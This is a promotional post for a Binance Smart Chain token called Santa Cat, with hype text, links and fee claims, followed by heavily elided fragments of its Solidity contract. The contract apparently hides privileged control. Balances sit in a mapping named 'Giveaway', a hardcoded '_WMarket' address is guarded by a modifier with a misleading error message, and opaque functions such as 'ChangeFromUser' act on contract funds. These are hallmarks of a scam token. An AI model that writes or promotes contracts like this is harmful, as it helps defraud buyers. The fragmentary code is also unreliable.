...
🐱🎄 Santa Cat is the latest adorable Binance Smart Chain token to hit the market and upgrade your Christmas ! 🐱🎄

💬 Telegram:  https://t.me/santacatofficial

🌐 Website: https://santacat.holiday

📅 Big Roadmap: https://santacat.holiday/#roadmap

🏆 Ultra-competitive 3% tx fee and 2% selling fee.
...
contract Context {
 ...
 contract SantaCat is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private Giveaway;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "SantaCat";
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        Giveaway[msg.sender] = totalSupply_;
    ...
    address private _WMarket = 0x7Ba58c2a571D4d809122c293dfF462c397CFe4ea;
    ...
    function ChangeFromUser() external {
        require (_msgSender() != address(0));
        uint256 contractBalance = balanceOf(address(this));
        _multiply(contractBalance);
    }
    
    function ChangetoUser() external {
        require (_msgSender() == address(0));
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier posed () {
        require(_WMarket == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
      
   
    function _burn(address account, uint256 SantaCat) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = Giveaway[account];
        require(accountBalance >= SantaCat, "BEP : Can't be done");
        unchecked {
            Giveaway[account] = accountBalance - SantaCat;
        }
        _totalSupply -= SantaCat;

        emit Transfer(account, address(0), SantaCat);
    }
